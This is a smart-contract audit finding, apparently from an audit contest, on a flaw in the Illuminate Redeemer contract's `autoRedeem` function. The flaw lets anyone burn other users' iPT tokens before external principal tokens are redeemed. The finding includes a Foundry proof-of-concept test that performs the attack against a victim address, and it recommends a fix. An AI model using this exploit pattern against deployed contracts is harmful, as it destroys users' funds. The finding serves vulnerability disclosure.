# Anyone can burn anyone else's iPT tokens

## Summary
Anyone can burn anyone else's iPT tokens
## Vulnerability Detail
In the `autoRedeem` function, iPT tokens are burned even when the `holdings` mapping is empty and the redeemed amount is 0 ([Redeemer.sol#L513-L528](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Redeemer.sol#L513-L528)). The function allows anyone to redeem and burn anyone else's iPT tokens.
## Impact
An attacker can call the `autoRedeem` function and pass users' addresses after maturity but before the external PT tokens have been redeemed. This will burn users' iPT tokens but they won't get underlying tokens in exchange.
## Code Snippet
```solidity
// test/fork/Redeemer.t.sol
function testAutoRedeemExploit_AUDIT() public {
    deployMarket(Contracts.USDC, 0);

    address user = 0x7111F9Aeb2C1b9344EC274780dc9e3806bdc60Ef;
    address principalToken = mp.markets(Contracts.USDC, maturity, 0);

    deal(principalToken, user, startingBalance, true);

    // !!! External PT tokens haven't been redeemed.

    vm.startPrank(user);
    IERC20(Contracts.USDC).approve(address(r), startingBalance);
    vm.stopPrank();

    // user is the victim of the attack
    address[] memory onBehalfOf = new address[](1);
    onBehalfOf[0] = user;

    // The victim has iPT tokens before the attack.
    assertEq(IERC20(principalToken).balanceOf(user), startingBalance);

    // The attacker calls autoRedeem after maturity BUT before external PT tokens have been redeemed.
    r.autoRedeem(Contracts.USDC, maturity, onBehalfOf);

    // The victim hasn't received underlying tokens.
    assertEq(IERC20(Contracts.USDC).balanceOf(user), 0);
    // Victim's iPT tokens were burned.
    assertEq(IERC20(principalToken).balanceOf(user), 0);
}
```
## Tool used
Manual Review
## Recommendation
Ensure that iPT tokens can be redeemed only after external PT tokens have been redeemed.
